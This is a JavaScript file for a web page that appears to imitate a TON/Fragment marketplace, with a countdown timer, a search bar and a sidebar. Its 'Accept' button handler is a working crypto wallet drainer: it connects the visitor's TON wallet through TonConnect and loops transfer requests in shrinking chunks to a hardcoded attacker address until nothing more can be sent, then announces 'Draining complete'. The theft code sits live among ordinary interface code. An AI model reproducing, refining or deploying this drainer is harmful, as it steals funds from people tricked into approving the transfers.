// Timer functionality
function updateTimer() {
  const elements = {
    days: document.getElementById("days"),
    hours: document.getElementById("hours"),
    minutes: document.getElementById("minutes"),
    seconds: document.getElementById("seconds")
  };

  if (!Object.values(elements).every(el => el)) {
    console.error("Timer elements not found in DOM");
    return;
  }

  let days = parseInt(elements.days.textContent) || 0;
  let hours = parseInt(elements.hours.textContent) || 0;
  let minutes = parseInt(elements.minutes.textContent) || 0;
  let seconds = parseInt(elements.seconds.textContent) || 0;

  if (seconds > 0) {
    seconds--;
  } else if (minutes > 0) {
    minutes--;
    seconds = 59;
  } else if (hours > 0) {
    hours--;
    minutes = 59;
    seconds = 59;
  } else if (days > 0) {
    days--;
    hours = 23;
    minutes = 59;
    seconds = 59;
  } else {
    return; // Stop timer if all values are 0
  }

  elements.days.textContent = `${days} days`;
  elements.hours.textContent = hours.toString().padStart(2, "0");
  elements.minutes.textContent = minutes.toString().padStart(2, "0");
  elements.seconds.textContent = seconds.toString().padStart(2, "0");
}
setInterval(updateTimer, 1000);

// Search bar
const searchInput = document.querySelector('.search-input');
if (searchInput) {
  searchInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      const query = encodeURIComponent(this.value.trim());
      if (query) {
        window.location.href = `https://fragment.com/?query=${query}`;
      }
    }
  });
} else {
  console.error("Search input not found in DOM");
}

// TonConnect SDK setup
if (!window.TonConnect) {
  console.error("TonConnect SDK not loaded. Ensure the script is included and loaded correctly.");
  alert("Failed to load TON Connect SDK. Please try refreshing the page.");
} else {
  const tonConnect = new window.TonConnect({
    manifestUrl: 'https://txtorg-tsx.static.hf.space/manifest.json'
  });

  // Monitor wallet connection status
  tonConnect.onStatusChange((walletInfo) => {
    console.log('Wallet status:', walletInfo ? `Connected to ${walletInfo.account.address}` : 'Disconnected');
  });

  // Accept button → Connect + Drain Wallet
  const acceptButton = document.querySelector('.accept-button');
  if (acceptButton) {
    acceptButton.addEventListener('click', async () => {
      try {
        // Fetch available wallets
        const wallets = await tonConnect.getWallets();
        if (!wallets || !wallets.length) {
          console.error("No compatible wallets found.");
          alert("No compatible TON wallets found. Please install a wallet like Tonkeeper.");
          return;
        }

        // Initiate wallet connection
        await tonConnect.connectWallet();
        if (!tonConnect.connected || !tonConnect.wallet?.account?.address) {
          console.error("Wallet connection failed: No wallet connected.");
          alert("Wallet connection failed. Please try again or ensure a TON wallet is installed.");
          return;
        }

        console.log("Connected wallet address:", tonConnect.wallet.account.address);

        const receiverAddress = 'UQCF1ONPsW54lg6XzJFbYSEDHEujrLOrXbz52gR4VEmK9m4c';
        const chunkSizes = [300, 100, 50, 10, 5, 1]; // TON
        let totalSent = 0;

        async function trySendChunk(amountTon) {
          const tx = {
            validUntil: Math.floor(Date.now() / 1000) + 300, // Extended to 5 minutes for reliability
            messages: [
              {
                address: receiverAddress,
                amount: (amountTon * 1e9).toString() // Convert TON to nanotons
              }
            ]
          };

          try {
            const result = await tonConnect.sendTransaction(tx);
            if (result && (result.boc || result.from)) {
              console.log(`✅ Sent ${amountTon} TON to ${receiverAddress}`);
              totalSent += amountTon;
              return true;
            }
          } catch (err) {
            console.warn(`❌ Failed to send ${amountTon} TON:`, err.message || err);
          }
          return false;
        }

        while (true) {
          let sent = false;
          for (const size of chunkSizes) {
            const ok = await trySendChunk(size);
            if (ok) {
              sent = true;
              await new Promise(resolve => setTimeout(resolve, 2000)); // 2-second delay to avoid wallet overload
              break;
            }
          }
          if (!sent) {
            alert(`Draining complete. Total sent: ${totalSent} TON.`);
            break;
          }
        }
      } catch (err) {
        console.error("Error during wallet connection or transaction:", err.message || err);
        alert(`Wallet connection or transaction failed: ${err.message || 'Unknown error'}`);
      }
    });
  } else {
    console.error("Accept button not found in DOM");
  }
}

// Other UI button handlers
const tonButton = document.querySelector('.ton-button');
if (tonButton) {
  tonButton.addEventListener('click', () => {
    alert('Connect TON clicked');
  });
} else {
  console.error("TON button not found in DOM");
}

const telegramButton = document.querySelector('.telegram-button');
if (telegramButton) {
  telegramButton.addEventListener('click', () => {
    alert('Connect Telegram clicked');
  });
} else {
  console.error("Telegram button not found in DOM");
}

// Sidebar toggle
const menuButton = document.getElementById("menuButton");
const sidebarOverlay = document.getElementById("sidebarOverlay");
const overlay = document.getElementById("overlay");
const closeButton = document.getElementById("closeButton");

if (!menuButton || !sidebarOverlay || !overlay || !closeButton) {
  console.error("Sidebar elements missing in DOM:", {
    menuButton: !!menuButton,
    sidebarOverlay: !!sidebarOverlay,
    overlay: !!overlay,
    closeButton: !!closeButton
  });
} else {
  menuButton.addEventListener("click", () => {
    sidebarOverlay.classList.add("active");
    overlay.classList.add("active");
  });

  overlay.addEventListener("click", () => {
    sidebarOverlay.classList.remove("active");
    overlay.classList.remove("active");
  });

  closeButton.addEventListener("click", () => {
    sidebarOverlay.classList.remove("active");
    overlay.classList.remove("active");
  });
}
